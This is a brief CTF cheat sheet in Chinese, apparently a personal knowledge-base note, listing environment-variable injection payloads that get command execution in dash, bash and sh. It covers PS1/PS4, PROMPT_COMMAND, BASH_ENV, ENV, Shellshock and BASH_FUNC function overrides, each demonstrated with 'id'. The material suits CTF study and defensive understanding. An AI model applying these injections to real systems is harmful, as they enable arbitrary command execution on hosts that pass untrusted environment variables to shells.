tags:: CTF/RCE, CTF/Shell

-
- # dash
	- ```shell
	  PS4='PS4 is worked $HOME Right?' dash -x -c "echo test"
	  PS1='`id`' dash
	  PS1='$(id)' dash
	  PROMPT_COMMAND='id' dash #退出dash的时候会执行
	  ```
- # bash
	- ```shell
	  BASH_ENV='$(id 1>&2)' bash -c 'echo hello'# shell_name为bash时触发
	  PROMPT_COMMAND='id' bash	#立即执行,因为每次换行后会换到一个新的bashshell
	  ```
	- shell shock
		- ```shell
		  TEST=() { :; }; id;
		  ```
	- `BASH_FUNC`
		- 原理
			- bash可以这样设置函数
				- ```shell
				  env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'
				  ```
			- 我们可以覆盖某些函数实现任意命令执行
				- ```shell
				  env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
				  ```
		- bash 4.2
			- ```shell
			  env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"
			  ```
		- bash 4.4+
			- ```shell
			  env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
			  ```
	- sh兼容模式
		- ```shell
		  ENV='$(id 1>&2)' sh -i -c "echo hello"
		  ```
-
- # 参考
	- https://www.cnblogs.com/h0cksr/p/16189733.html
	-